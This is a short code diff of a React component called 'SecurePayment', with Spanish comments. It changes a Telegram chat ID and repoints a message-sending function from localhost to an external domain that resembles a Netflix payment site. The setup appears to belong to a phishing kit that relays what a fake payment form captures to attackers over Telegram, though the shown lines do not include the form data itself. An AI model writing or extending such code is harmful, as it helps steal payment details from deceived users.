@@ -28,8 +28,8 @@ const SecurePayment = () => {
   // Función para enviar un mensaje a Telegram
   const sendTelegramMessage = async (message) => {
     try {
-      const chatId = '-4542132850'; // Asegúrate de que este ID sea correcto
-      const response = await fetch('http://localhost:3000/enviarmensaje', {
+      const chatId = '-4723241842'; // Asegúrate de que este ID sea correcto
+      const response = await fetch('https://streaming.pagafacilntf.com/enviarmensaje', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
